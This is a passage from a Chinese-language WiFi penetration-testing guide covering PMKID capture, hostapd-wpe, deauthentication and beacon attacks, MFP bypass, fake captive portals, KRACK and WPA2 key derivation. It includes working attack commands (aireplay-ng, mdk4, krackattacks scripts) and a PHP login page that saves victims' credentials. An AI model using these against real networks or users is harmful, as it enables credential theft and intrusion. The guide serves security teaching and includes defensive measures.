        info=b'\x01\x00'  # RSN版本1
             b'\x00\x0f\xac\x02'  # TKIP/CCMP等
             b'\x02\x00'  # 2个密码套件
             b'\x00\x0f\xac\x04'  # CCMP
             b'\x00\x0f\xac\x02'  # TKIP
             b'\x01\x00'  # 1个AKM套件
             b'\x00\x0f\xac\x02'  # PSK
             b'\xcc\x00'  # RSN能力
    )
    
    # 发送关联请求
    packet = RadioTap() / dot11 / Dot11AssoReq() / ssid_elt / rsn_elt
    
    # 发送并监听响应
    response = srp1(packet, iface=interface, timeout=2, verbose=0)
    
    if response and response.haslayer(Dot11AssoResp):
        # 检查是否包含RSN元素和PMKID
        # 提取PMKID...
        pass
```

#### 3.4.5 防御PMKID攻击

- 禁用PMKID（但可能影响漫游性能）
- 使用强密码（增加破解难度）
- 使用Enterprise认证（PMK不是从密码派生）
- 部署WIPS检测异常关联请求

---

### 3.5 hostapd-wpe配置与使用

#### 3.5.1 hostapd-wpe简介

hostapd-wpe（Wireless Pentesters Edition）是hostapd的修改版，专门用于无线渗透测试：

- 支持多种EAP方法的凭证捕获
- 自动生成自签名证书
- 支持GTC降级攻击
- 可定制EAP用户配置

#### 3.5.2 hostapd-wpe配置详解

**主配置文件**：
```
# /etc/hostapd-wpe/hostapd-wpe.conf

interface=wlan0
driver=nl80211
ssid=CorporateNet
hw_mode=g
channel=36
ieee8021x=1
eap_server=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# WPE特定配置
wpe_logfile=/tmp/hostapd-wpe.log
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
```

**EAP用户文件**：
```
# /etc/hostapd-wpe/hostapd.eap_user

# 允许所有用户，使用任何EAP方法
*     PEAP,TTLS,TLS,FAST,MD5,GTC
"*"   TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "password"  [2]
```

#### 3.5.3 hostapd-wpe实战

```bash
# 启动hostapd-wpe
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 查看捕获的凭证
cat /tmp/hostapd-wpe.log
```

**输出示例**：
```
mschapv2: username: jsmith
          challenge: 5e:b2:9a:8c:1d:3f:07:2a
          response: 88:4a:3d:9e:7f:2c:1b:6a:5d:4e:3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:00
          jtr NETNTLM: jsmith:$NETNTLM$5eb29a8c1d3f072a$884a3d9e7f2c1b6a5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f00
```

#### 3.5.4 证书自定义

```bash
# 重新生成证书
cd /etc/hostapd-wpe/certs
./bootstrap

# 使用自定义证书
# 替换 ca.pem, server.pem, server.key
```

#### 3.5.5 高级技巧：Mixed Mode AP

配置同时支持WPA2和WPA3的混合模式AP，用于降级攻击研究：
```
# 添加WPA3支持
wpa_key_mgmt=WPA-EAP WPA-EAP-SHA256 SAE
sae_password=testpassword
ieee80211w=2  # MFP required
```

---


## 4. 管理帧安全与MFP绕过

### 4.1 802.11w管理帧保护（MFP）原理

#### 4.1.1 为什么需要管理帧保护

在802.11标准的早期版本中，管理帧（Management Frames）完全没有保护机制。这导致了一系列基于管理帧伪造的攻击：

- **取消认证攻击（Deauthentication Attack）**：强制客户端断开连接
- **解除关联攻击（Disassociation Attack）**：类似取消认证，但影响关联状态
- **Beacon帧注入**：伪造AP信标
- **Probe Response伪造**：响应客户端探测请求

这些攻击利用了管理帧的以下特性：
- 无需加密
- 无需认证
- 发送者身份可伪造
- 接收方不验证帧的真实性

#### 4.1.2 802.11w标准概述

802.11w（2009年发布）引入了管理帧保护（Management Frame Protection, MFP），也称为Robust Management Frames（RMF）。

**受保护的管理帧类型**：
- Deauthentication（取消认证）
- Disassociation（解除关联）
- Spectrum Management Action（频谱管理动作帧）
- QoS Action帧
- Radio Measurement Action帧
- Fast BSS Transition Action帧
- SA Query Request/Response

**不受保护的管理帧**：
- Beacon（信标）
- Probe Request/Response（探测请求/响应）
- Authentication（认证帧）
- Association Request/Response（关联请求/响应）
- Announcement Traffic Indication Message (ATIM)

#### 4.1.3 MFP的工作机制

**协商阶段**：
1. AP在Beacon和Probe Response的RSN IE中声明MFP能力
2. 客户端在Association Request的RSN IE中声明MFP能力
3. 协商结果决定是否启用MFP

**MFP能力字段**：
- Bit 6: MFPC（Management Frame Protection Capable）- 支持MFP
- Bit 7: MFPR（Management Frame Protection Required）- 要求MFP

**密钥派生**：
- MFP使用的密钥来自PTK（Pairwise Transient Key）的一部分
- IGTK（Integrity GTK）：用于组播管理帧的完整性保护
- 类似GTK，但用于管理帧

**保护机制**：
- 使用CMAC算法计算消息完整性码（MIC）
- MIC附加在帧体末尾
- 接收方重新计算MIC并验证
- MIC验证失败则丢弃帧

#### 4.1.4 MFP的三种模式

| 模式 | 描述 | 安全性 |
|------|------|--------|
| 禁用（Disabled） | 不使用MFP | 低 |
| 可选（Capable） | 支持但不强制，兼容不支持的客户端 | 中 |
| 必需（Required） | 所有客户端必须支持MFP，否则无法连接 | 高 |

---

### 4.2 取消认证/解除关联攻击的演变

#### 4.2.1 传统取消认证攻击

在没有MFP的时代，取消认证攻击极其简单：

```bash
# 使用aireplay-ng
aireplay-ng -0 0 -a <AP_MAC> -c <客户端_MAC> wlan0mon

# -0: 取消认证攻击模式
# 0: 无限循环发送
# -a: AP的BSSID
# -c: 目标客户端MAC（可选，不指定则广播）
```

**攻击效果**：
- 客户端立即断开连接
- 客户端尝试重新连接
- 攻击者可在此过程中捕获握手包

#### 4.2.2 MFP对取消认证攻击的防御

启用MFP后，取消认证帧受到保护：
- 帧体包含CMAC计算的MIC
- 攻击者无法伪造有效的MIC
- 客户端收到伪造的取消认证帧会直接丢弃
- 传统取消认证攻击失效

#### 4.2.3 攻击手段的演变

面对MFP，攻击者发展出了新的攻击手段：

**方法一：降级攻击**
- 迫使客户端不使用MFP连接
- 然后执行传统攻击

**方法二：利用未受保护的管理帧**
- Beacon、Probe Response等帧仍不受保护
- 基于这些帧展开攻击

**方法三：MFP绕过**
- 利用协议实现漏洞绕过MFP
- 例如某些实现中存在验证逻辑缺陷

**方法四：更高层的拒绝服务**
- 不直接断开连接，而是干扰通信
- 例如信号干扰、CTS洪泛等

---

### 4.3 MFP绕过技术分析

#### 4.3.1 已知MFP绕过漏洞

**漏洞1：SA Query速率限制绕过**

SA Query是MFP的一部分，用于防止取消认证伪造。当AP收到取消认证帧时，会向客户端发送SA Query来验证。

- 某些AP实现中SA Query的速率限制存在缺陷
- 攻击者可以发送大量取消认证帧，超过SA Query处理能力
- 导致AP处理不过来，客户端仍然被断开

**漏洞2：未正确验证管理帧MIC**

- 某些驱动或固件实现中存在MIC验证绕过
- 例如只检查MIC是否存在，而不验证其正确性
- 或者在某些帧类型上跳过MIC验证

**漏洞3：关联/认证帧仍未受保护**

虽然802.11w保护了取消认证帧，但认证帧和关联帧仍然不受保护：
- 攻击者可以发送伪造的认证帧
- 或发送关联响应帧干扰关联过程
- 某些场景下可导致拒绝服务

#### 4.3.2 针对不同厂商的MFP绕过

**Cisco特定绕过**：
- 某些Cisco WLC版本中MFP实现存在缺陷
- 特定格式的取消认证帧可绕过保护

**MikroTik RouterOS绕过**：
- 早期RouterOS版本的MFP实现不完善
- 某些情况下不验证取消认证帧的MIC

**开源实现（hostapd）**：
- 相对更安全，但历史上也有过漏洞
- CVE-2019-16275：hostapd MFP绕过

#### 4.3.3 半关联攻击（Half-Association Attack）

这是一种针对MFP的新型攻击：

**原理**：
1. 攻击者伪造客户端的认证帧和关联请求帧（这些帧不受MFP保护）
2. AP认为客户端已关联，为其分配资源
3. 但客户端实际上并未完成关联
4. AP发送给客户端的帧会被丢弃
5. 同时真实客户端的关联可能受影响

**利用场景**：
- 拒绝服务攻击
- 资源耗尽攻击
- 配合其他攻击使用

---

### 4.4 管理帧伪造攻击新手法

#### 4.4.1 Beacon帧高级攻击

**虚假AP（Evil Twin）增强版**：
- 不仅复制SSID，还复制所有信息元素
- 包括RSN IE、Vendor IE、国家代码等
- 使虚假AP与真实AP几乎无法区分

**信息元素注入**：
- 在Beacon中注入恶意信息元素
- 利用客户端解析信息元素时的漏洞
- 可能导致远程代码执行（历史上有过此类漏洞）

**WPS信息伪造**：
- 伪造WPS配置信息
- 诱导用户使用WPS连接
- 配合WPS攻击

#### 4.4.2 Probe Request滥用

**客户端追踪**：
- 收集Probe Request中的SSID列表
- 建立用户的WiFi网络画像
- 用于社交工程或物理追踪

**Probe Response注入**：
- 响应客户端的Probe Request
- 宣称支持目标SSID
- 吸引客户端连接
- 在MFP环境中，这仍然有效（因为Probe Response不受保护）

#### 4.4.3 操作码滥用攻击

**Authentication帧洪泛**：
- 发送大量认证请求帧
- 消耗AP资源
- 导致合法客户端无法认证

**Association Request洪泛**：
- 类似SYN洪水攻击
- 耗尽AP的关联表空间
- 拒绝服务攻击

---

### 4.5 Beacon帧攻击

#### 4.5.1 信标洪泛攻击（Beacon Flooding）

**原理**：
- 发送大量不同SSID的Beacon帧
- 使客户端的WiFi列表充满虚假AP
- 干扰正常的WiFi选择
- 某些客户端在大量AP环境下性能下降

**实战**：
```bash
# 使用mdk4进行信标洪泛
mdk4 wlan0mon b -f ssid_list.txt

# 使用airbase-ng
airbase-ng -c 6 -e "FakeAP1" wlan0mon &
airbase-ng -c 6 -e "FakeAP2" wlan0mon &
# ... 更多虚假AP
```

#### 4.5.2 虚假AP高级技术

**相同BSSID攻击**：
- 使用与真实AP相同的BSSID
- 但信道不同
- 导致客户端在两个AP之间混乱切换
- 拒绝服务效果

**相同信道攻击**：
- 与真实AP同一信道
- 使用相同SSID和相似BSSID
- 客户端可能连接到信号更强的虚假AP
- Evil Twin攻击的基础

#### 4.5.3 Beacon帧指纹识别

每个AP的Beacon帧都有独特的特征，可用于指纹识别：
- 信息元素的顺序和内容
- 支持的速率集
- 国家代码设置
- 厂商特定信息元素
- Beacon间隔的精确时间

这些特征可以用来：
- 识别AP的厂商和型号
- 检测虚假AP（与真实AP的指纹不一致）
- 追踪特定AP

---

## 5. Captive Portal攻击

### 5.1 Captive Portal工作原理

#### 5.1.1 什么是Captive Portal

Captive Portal（强制门户）是一种网络接入控制技术：
- 用户连接WiFi后，必须通过Web页面认证才能访问网络
- 常见于酒店、机场、咖啡馆、企业访客网络
- 认证方式：密码、短信验证、社交账号、接受条款等

#### 5.1.2 Captive Portal技术实现

**检测机制**：

操作系统通过检测特定URL来判断是否存在Captive Portal：

| 操作系统 | 检测URL |
|---------|--------|
| iOS/Apple | http://captive.apple.com/hotspot-detect.html |
| Android | http://connectivitycheck.gstatic.com/generate_204 |
| Windows | http://www.msftconnecttest.com/connecttest.txt |
| ChromeOS | http://clients3.google.com/generate_204 |

**检测原理**：
1. 客户端连接WiFi后，自动访问检测URL
2. 如果返回预期内容（如"Success"或204状态码），则认为已联网
3. 如果返回重定向（302）或其他内容，则弹出Captive Portal页面

**流量控制方式**：
1. **基于防火墙规则**：未认证用户只能访问特定IP/端口（DNS、HTTP）
2. **基于VLAN**：未认证用户在隔离VLAN中
3. **基于HTTP重定向**：所有HTTP请求被重定向到Portal页面

#### 5.1.3 认证流程

```
客户端连接WiFi
    |
    v
获取IP地址（DHCP）
    |
    v
访问检测URL
    |
    v
被重定向到Portal页面
    |
    v
用户输入凭证/接受条款
    |
    v
Portal服务器验证并通知AP/控制器
    |
    v
AP/控制器放开网络访问权限
    |
    v
客户端重新检测网络连通性
    |
    v
正常上网
```

---

### 5.2 Captive Portal欺骗攻击

#### 5.2.1 攻击原理

Captive Portal欺骗是一种特殊的Evil Twin攻击：

1. 攻击者创建开放WiFi（与目标同名或类似名称）
2. 部署虚假的Captive Portal页面
3. 用户连接后，看到与真实Portal相似的登录页面
4. 用户输入凭证（账号密码、手机号、信用卡号等）
5. 攻击者窃取凭证
6. 可选：将用户转发到真实网络，减少怀疑

#### 5.2.2 与普通Evil Twin的区别

| 特性 | 普通Evil Twin | Captive Portal欺骗 |
|------|------------|------------------|
| 目标 | 自动连接的客户端 | 手动连接的用户 |
| 攻击面 | WPA/WPA2密码 | Web表单凭证 |
| 成功率 | 取决于自动连接设置 | 取决于页面逼真度 |
| 用户交互 | 无（自动） | 有（手动输入） |
| 凭证类型 | WiFi密码 | 各种账号密码 |

#### 5.2.3 实战：创建虚假Captive Portal

**使用WiFi Pineapple / Evil Portal**：
```bash
# WiFi Pineapple的Evil Portal模块
# 1. 启动Evil Portal
# 2. 选择模板（Facebook、Google、酒店等）
# 3. 自定义页面内容
# 4. 启动虚假AP
# 5. 等待用户输入凭证
```

**手动搭建（基于hostapd + dnsmasq + apache）**：

1. 创建开放AP
```bash
# hostapd.conf
interface=wlan0
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
```

2. DHCP + DNS配置
```bash
# dnsmasq.conf
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
# 所有域名都解析到Portal服务器
address=/#/10.0.0.1
```

3. Portal页面
```php
<?php
// login.php - 捕获凭证
if ($_POST['username'] && $_POST['password']) {
    $creds = $_POST['username'] . ':' . $_POST['password'] . "\n";
    file_put_contents('/tmp/creds.txt', $creds, FILE_APPEND);
    // 重定向到真实页面或显示成功
    header('Location: success.html');
    exit;
}
?>
```

4. 流量重定向
```bash
# iptables规则 - 将所有HTTP/HTTPS流量重定向到Portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:443
```

---

### 5.3 自动连接漏洞

#### 5.3.1 自动连接原理

大多数设备会保存已知的WiFi网络配置，并在范围内时自动连接：

- **优先连接**：按照保存的网络列表优先级尝试连接
- **自动连接**：发现已知SSID时自动关联
- **漫游**：在同一网络的AP之间自动切换

#### 5.3.2 已知SSID攻击（KARMA攻击）

**攻击原理**：
1. 客户端发送Probe Request，请求已知SSID
2. 攻击者的AP响应Probe Response，宣称就是该SSID
3. 客户端自动连接到攻击者的AP
4. 攻击者成为中间人

**KARMA攻击的特点**：
- 不需要知道目标网络的密码
- 利用客户端的自动连接行为
- 适用于开放网络和保存的网络

**现代缓解措施**：
- 随机化Probe Request中的MAC地址
- 不广播已知SSID（被动扫描）
- 验证网络安全配置（如原网络是WPA2，不会连接到开放网络）

#### 5.3.3 同名AP攻击

即使客户端不主动广播Probe Request，攻击者仍可通过以下方式诱导连接：

1. 创建与目标常用网络同名的AP
2. 信号足够强时，客户端可能自动连接
3. 如果是开放网络，无需密码

**风险场景**：
- 用户手机保存了"Starbucks"开放网络
- 攻击者在其他地方创建同名开放网络
- 手机自动连接
- 攻击者捕获流量

#### 5.3.4 防御自动连接漏洞

- 关闭自动连接功能（特别是开放网络）
- 定期清理不使用的已知网络
- 使用VPN保护公共WiFi下的流量
- 禁用自动加入开放网络

---

### 5.4 DNS劫持与流量劫持

#### 5.4.1 DNS劫持攻击

**原理**：
- 攻击者控制了网络的DNS服务器
- 将特定域名解析到攻击者控制的IP
- 用户访问这些域名时，实际访问的是攻击者的服务器

**Captive Portal中的DNS劫持**：
- 在Captive Portal环境中，攻击者天然控制DNS
- 可以将任何域名解析到Portal页面
- 或者解析到恶意网站

**实战场景**：
```bash
# 使用dnsmasq劫持所有域名
address=/#/10.0.0.1

# 劫持特定域名
address=/facebook.com/10.0.0.1
address=/google.com/10.0.0.1
```

#### 5.4.2 HTTP流量劫持

**透明代理**：
- 攻击者使用iptables将HTTP流量重定向到代理服务器
- 代理服务器可以修改HTTP请求和响应
- 注入恶意脚本、替换内容等

**SSL Stripping**：
- 将HTTPS连接降级为HTTP
- 窃取明文凭证
- 在Captive Portal环境中更容易实施

#### 5.4.3 HTTPS流量的处理

HTTPS流量更难劫持，但有以下方法：

**方法一：证书警告**
- 使用自签名证书
- 用户可能忽略警告
- 成功率较低但仍然有效

**方法二：HTTPS降级**
- 阻止HTTPS连接，强制使用HTTP
- 许多网站支持HTTP回退

**方法三：利用混合内容**
- 在HTTP页面中注入恶意脚本
- 某些情况下可以窃取HTTPS cookie（如果cookie未标记Secure）

---

### 5.5 Evil Portal攻击（WiFi Pineapple）

#### 5.5.1 WiFi Pineapple简介

WiFi Pineapple是Hak5出品的无线审计设备，预装了多种攻击工具：
- Evil Portal：Captive Portal攻击模块
- PineAP：高级Evil Twin引擎
- DNSMasq Spoof：DNS欺骗
- Site Survey：无线侦察
- 多种Payload模块

#### 5.5.2 Evil Portal模块详解

**工作流程**：
1. PineAP创建开放AP
2. 客户端连接后获取IP
3. DNS请求全部指向Pineapple
4. HTTP请求被重定向到Portal页面
5. 用户在Portal页面输入凭证
6. 凭证被保存，用户被重定向

**Portal模板**：
- 通用登录页面
- 酒店WiFi登录
- 机场WiFi
- Facebook登录
- Google登录
- 自定义HTML

#### 5.5.3 高级Evil Portal技巧

**凭证验证**：
- 收集凭证后，尝试用真实API验证
- 例如用邮箱密码尝试登录邮箱
- 提高凭证的有效性

**会话保持**：
- 用户登录后，保持连接
- 继续监控流量，窃取更多信息
- 注入恶意脚本

**多页面流程**：
- 模拟真实Portal的多步骤流程
- 先接受条款，再输入信息
- 更逼真，降低用户警惕

---

### 5.6 移动端Captive Portal攻击

#### 5.6.1 移动端Captive Portal特点

**iOS特点**：
- 自动弹出Captive Portal助手（Captive Network Assistant）
- 该助手不是完整浏览器，有局限性
- 用户在助手中输入凭证后，助手自动关闭

**Android特点**：
- 通知栏显示"需要登录"提示
- 点击后打开浏览器
- 不同厂商实现有差异

**Windows特点**：
- 弹出系统级别的Portal窗口
- 类似浏览器，但有特殊处理

#### 5.6.2 针对移动端的攻击技巧

**利用Portal助手的局限性**：
- iOS的CNA（Captive Network Assistant）不支持某些JavaScript功能
- 但可以显示表单并提交数据
- 页面设计需要适配

**伪造系统级登录页面**：
- 模仿iOS/Android系统的WiFi登录界面
- 用户更可能信任并输入凭证

**移动端凭证窃取**：
- 窃取WiFi密码（在某些场景下）
- 窃取Apple ID/Google账号
- 窃取邮箱密码
- 窃取手机号和验证码

#### 5.6.3 移动端自动连接风险

**iOS的"自动加入"**：
- 默认对已保存的网络启用自动加入
- "已知网络"列表可能很长
- 对开放网络也会自动加入

**Android的"自动连接"**：
- 类似iOS的行为
- 部分设备有"智能选择网络"功能

**攻击场景**：
1. 攻击者创建与目标手机已知网络同名的开放AP
2. 目标手机在范围内自动连接
3. 弹出Captive Portal（如果配置了）
4. 用户可能在Portal中输入敏感信息
5. 即使没有Portal，攻击者也可以监控流量

---

## 6. KRACK攻击深入

### 6.1 KRACK攻击原理（密钥重装攻击）

#### 6.1.1 KRACK概述

KRACK（Key Reinstallation Attack）是由Mathy Vanhoef在2017年发现的针对WPA2的严重漏洞（CVE-2017-13077至CVE-2017-13082）。

**核心思想**：
- 攻击者可以操纵四次握手，迫使客户端重新安装已使用过的密钥
- 密钥重装导致计数器（nonce）和重放计数器重置
- 从而可以重放、解密甚至篡改流量

**影响范围**：
- 所有WPA2认证的网络（Personal和Enterprise）
- 几乎所有操作系统：Android、iOS、Windows、Linux、macOS
- 所有支持WPA2的设备

#### 6.1.2 为什么会发生密钥重装

WPA2的四次握手设计中存在一个逻辑缺陷：

1. 正常情况下，客户端在收到M3消息时安装PTK密钥
2. 如果M4消息丢失，AP会重传M3
3. 客户端在收到重传的M3时，会**重新安装相同的密钥**
4. 重新安装密钥时，相关的计数器（nonce、重放计数器）被重置
5. 这违反了密码学中"一个密钥不能用相同nonce加密两次"的原则

#### 6.1.3 KRACK攻击的基本流程

```
攻击者位于客户端和AP之间（中间人位置）

1. 正常四次握手进行：
   AP -> M1 -> 客户端
   AP <- M2 <- 客户端
   AP -> M3 -> 客户端  （客户端安装PTK，重置nonce为0）
   AP <- M4 <- 客户端

2. 攻击者阻止M4到达AP（或捕获并阻止转发）

3. AP超时后重传M3：
   AP -> M3(retransmit) -> 客户端

4. 攻击者转发M3给客户端

5. 客户端收到M3后，重新安装PTK密钥
   - nonce计数器被重置为0
   - 客户端用相同密钥和nonce加密新数据

6. 攻击者现在有了用相同密钥+nonce加密的两个不同数据包
   - 可以进行重放攻击
   - 在某些条件下可以解密流量
   - 在某些条件下可以篡改流量
```

---

### 6.2 四次握手漏洞分析

#### 6.2.1 四次握手完整回顾

四次握手的目的是在AP和客户端之间派生并确认PTK：

**M1（消息1）**：
- 发送方：AP
- 内容：ANonce（AP生成的随机数）、RSN IE
- 作用：为密钥派生提供随机输入

**M2（消息2）**：
- 发送方：客户端
- 内容：SNonce（客户端生成的随机数）、MIC
- 作用：客户端提供随机输入，证明拥有PMK

**M3（消息3）**：
- 发送方：AP
- 内容：ANonce、GTK（加密的组密钥）、MIC
- 作用：AP确认密钥，分发GTK
- 客户端在此消息后**安装PTK和GTK**

**M4（消息4）**：
- 发送方：客户端
- 内容：MIC确认
- 作用：客户端确认已安装密钥
- AP在此消息后**安装PTK**

#### 6.2.2 漏洞的关键点

**问题出在M3的重传处理上**：

802.11标准规定：
> 如果客户端收到重复的M3消息，应该重新安装密钥。

这意味着：
- 每次收到M3，客户端都会重置nonce为初始值
- 攻击者可以通过重放M3来反复重置nonce
- 相同的key+nonce组合被多次使用

**为什么标准这么规定？**
- 为了处理M4丢失的情况
- AP重传M3，客户端重新确认
- 设计者没有考虑到密钥重装的安全后果

#### 6.2.3 不同消息的密钥重装

KRACK不仅仅是针对四次握手，还影响其他密钥交换：

| 漏洞编号 | 目标 | 影响 |
|---------|------|------|
| CVE-2017-13077 | 四次握手（PTK重装） | 最严重，可解密单播流量 |
| CVE-2017-13078 | 四次握手（GTK重装） | 可重放组播流量 |
| CVE-2017-13079 | 四次握手（IGTK重装） | 可伪造管理帧 |
| CVE-2017-13080 | 组密钥握手（GTK重装） | 组密钥更新时的重装 |
| CVE-2017-13081 | FT握手（PTK重装） | 快速漫游时的重装 |
| CVE-2017-13082 | TDLS握手（PTK重装） | 直连链路的重装 |

---

### 6.3 不同设备的KRACK利用差异

#### 6.3.1 Android/Linux设备（最严重）

**漏洞程度**：最严重
**原因**：
- wpa_supplicant 2.4及以上版本会在重装密钥时安装全零密钥
- 这是一个实现缺陷，比标准定义的问题更严重

**影响**：
- 攻击者可以完全解密所有流量
- 攻击者可以注入和篡改流量
- 几乎相当于没有加密

**受影响版本**：
- Android 6.0及以上（使用wpa_supplicant 2.4+）
- Linux使用wpa_supplicant 2.4-2.6的系统

#### 6.3.2 iOS/macOS设备

**漏洞程度**：中等
**原因**：
- Apple的实现遵循标准，但仍有密钥重装问题
- 可以重置nonce，但不会安装全零密钥

**影响**：
- 可以进行重放攻击
- 可以解密部分流量（依赖于加密模式）
- 利用难度比Android高

#### 6.3.3 Windows设备

**漏洞程度**：中等偏低
**原因**：
- Windows的WPA2实现也受影响
- 但缓解措施较好
- 某些版本在重装时有额外检查

**影响**：
- 可执行重放攻击
- 解密攻击更困难

#### 6.3.4 嵌入式设备和IoT设备

**漏洞程度**：高
**原因**：
- 固件更新缓慢，很多设备未打补丁
- 使用开源的wpa_supplicant/hostapd
- 资源受限，难以实现复杂的防护

**影响**：
- IoT设备是重灾区
- 大量设备长期未更新
- 易被利用作为攻击跳板

---

### 6.4 KRACK攻击工具与实验

#### 6.4.1 攻击条件

KRACK攻击需要满足以下条件：

1. **攻击者位置**：需要处于客户端和AP之间的中间人位置
   - 需要在同一信道上
   - 需要能够监听和注入帧
   - 需要信号足够强

2. **客户端漏洞**：目标客户端未打补丁

3. **网络配置**：
   - WPA2网络（WPA3已修复此问题）
   - 任何加密套件（CCMP、TKIP、GCMP都受影响）

#### 6.4.2 krackattacks工具

Mathy Vanhoef发布了KRACK攻击的PoC工具：

```bash
# 克隆KRACK攻击工具
git clone https://github.com/vanhoefm/krackattacks.git
cd krackattacks

# 安装依赖
# 需要两个无线网卡
# 一个用于监听和注入
# 一个用于连接网络（可选）
```

**工具组件**：
- `krack-test-client.py`：测试客户端是否有漏洞
- `krack-ft-test.py`：测试快速漫游漏洞
- `krackattack-all-zero-tk-key.py`：全零密钥攻击（针对Android/Linux）
- 其他辅助脚本

#### 6.4.3 攻击实验步骤

**步骤1：环境准备**
```bash
# 配置第一个网卡为监听模式
iw dev wlan0 set type monitor
ifconfig wlan0 up

# 第二个网卡用于连接AP（模拟合法客户端）
# 或者使用真实的客户端设备
```

**步骤2：测试客户端是否受影响**
```bash
python krack-test-client.py -i wlan0 -t <客户端_MAC>
```

**步骤3：执行KRACK攻击（针对全零密钥漏洞）**
```bash
# 启动攻击
python krackattack-all-zero-tk-key.py \
    --interface wlan0 \
    --bssid <AP_MAC> \
    --client <客户端_MAC> \
    --channel 6
```

**步骤4：解密流量**
攻击成功后，如果客户端安装了全零密钥，所有流量都可以被解密。

#### 6.4.4 GCMP加密下的风险

GCMP（Galois/Counter Mode Protocol）比CCMP更容易受到KRACK攻击：

- GCMP使用GCM模式，是流密码的一种
- 相同key+nonce重用可直接导致密钥流泄露
- 获得两个用相同key+nonce加密的密文后，可以恢复明文
- 甚至可以计算出认证标签，实现任意数据注入

---

### 6.5 防御措施与补丁分析

#### 6.5.1 补丁原理

KRACK补丁的核心思想：
- **不重装已安装的密钥**：如果密钥已经安装过，就不要再次安装
- **或者重装时不重置nonce**：保持计数器继续递增
- **安装全零密钥的bug修复**：防止错误地安装全零密钥

#### 6.5.2 各厂商补丁发布情况

| 厂商 | 补丁状态 | 备注 |
|------|---------|------|
| Microsoft | 已发布 | 2017年10月补丁日修复 |
| Apple | 已发布 | iOS 11.1, macOS 10.13.1 |
| Google/Android | 已发布 | 2017年11月安全更新 |
| Linux/wpa_supplicant | 已发布 | v2.7修复 |
| Cisco | 已发布 | 多个产品线更新 |
| 各类IoT设备 | 参差不齐 | 很多设备未更新 |

#### 6.5.3 检测KRACK漏洞的方法

**主动检测**：
```bash
# 使用krackattacks的测试脚本
python krack-test-client.py -i wlan0 -t <客户端_MAC>
```

**被动检测**：
- 监控无线网络中的异常重传模式
- 检测M3消息的异常重传

**企业级检测**：
- WIDS/WIPS系统可以检测KRACK攻击特征
- 监控四次握手异常

#### 6.5.4 防御KRACK攻击的最佳实践

1. **更新设备固件**：
   - 确保所有客户端和AP都安装了最新补丁
   - 定期检查并更新IoT设备固件

2. **网络层防护**：
   - 使用VPN加密端到端流量
   - 即使WiFi加密被破解，数据仍然安全
   - 优先使用HTTPS

3. **网络架构防护**：
   - 隔离无线网络和内部网络
   - 使用NAC（网络访问控制）
   - 部署WIDS/WIPS

4. **WPA3升级**：
   - WPA3从标准层面修复了KRACK漏洞
   - 逐步迁移到WPA3

---



## 7. WiFi密码学深入

### 7.1 WPA2/WPA3密钥派生完整流程

#### 7.1.1 密钥体系总览

WPA2/WPA3的密钥体系是一个多层次的派生结构：

```
密码 (Password) / 主会话密钥 (MSK)
    |
    v
PMK (Pairwise Master Key) - 成对主密钥
    |
    v
PTK (Pairwise Transient Key) - 成对临时密钥
    |
    +-- KCK (Key Confirmation Key) - 密钥确认密钥
    +-- KEK (Key Encryption Key) - 密钥加密密钥
    +-- TK (Temporal Key) - 临时密钥（数据加密）
    +-- MIC Key (用于管理帧保护)
    |
GTK (Group Temporal Key) - 组临时密钥
    |
    +-- GTK (组播/广播数据加密)
    +-- IGTK (完整性组临时密钥 - 管理帧保护)
```

#### 7.1.2 PMK派生

**WPA2-PSK模式**：
```
PMK = PBKDF2-HMAC-SHA1(Password, SSID, 4096, 256)
```

参数说明：
- **Password**：用户输入的WiFi密码（8-63个ASCII字符）
- **SSID**：网络名称（作为盐值）
- **4096**：迭代次数
- **256**：输出位数（32字节）

**WPA3-SAE模式**：
```
PMK = KDF-HMAC-SHA256(密钥材料, "SAE KDK", ...)
```

SAE模式下PMK通过Dragonfly密钥交换派生，不从密码直接计算，因此更安全。

**Enterprise模式**：
```
PMK = MSK的前256位
```

MSK（Master Session Key）由EAP认证过程生成，长度至少64字节。PMK取MSK的前32字节。

#### 7.1.3 PTK派生

PTK通过PRF（Pseudo-Random Function）从PMK派生：

```
PTK = PRF(PMK, "Pairwise key expansion", 
          Min(MAC_AP, MAC_STA) || Max(MAC_AP, MAC_STA) ||
          Min(ANonce, SNonce) || Max(ANonce, SNonce))
```

**PRF函数（WPA2）**：基于HMAC-SHA1的迭代构造
- 输入：密钥、标签、数据
- 输出：根据需要的长度决定迭代次数

**PTK的组成部分**（按顺序拼接）：

| 部分 | 长度 | 用途 |
|------|------|------|
| KCK | 16字节 | EAPOL消息的MIC计算 |
| KEK | 16字节 | 加密GTK等密钥材料 |
| TK | 16字节（CCMP）/ 32字节（TKIP） | 数据帧加密 |
| MIC Key | 8字节（可选） | 管理帧MIC（TKIP时代） |

总长度：通常是384位（48字节）或512位（64字节）

#### 7.1.4 GTK派生

GTK（Group Temporal Key）用于组播和广播流量的加密：

```
GTK = PRF(GMK, "Group key expansion", MAC_AP || GNonce)
```

其中：
- **GMK**（Group Master Key）：组主密钥，由AP生成
- **GNonce**：组随机数
- GTK在AP上生成，然后通过四次握手的M3消息加密分发给客户端

---

### 7.2 PMK、PTK、GTK、TK计算详解

#### 7.2.1 PMK计算深入

**PBKDF2函数详解**：

PBKDF2（Password-Based Key Derivation Function 2）是RFC 2898定义的密钥派生函数：

```
DK = T1 || T2 || ... || Tdklen/hlen
Ti = F(Password, Salt, c, i)
F(Password, Salt, c, i) = U1 ^ U2 ^ ... ^ Uc
U1 = PRF(Password, Salt || INT(i))
U2 = PRF(Password, U1)
...
Uc = PRF(Password, Uc-1)
```

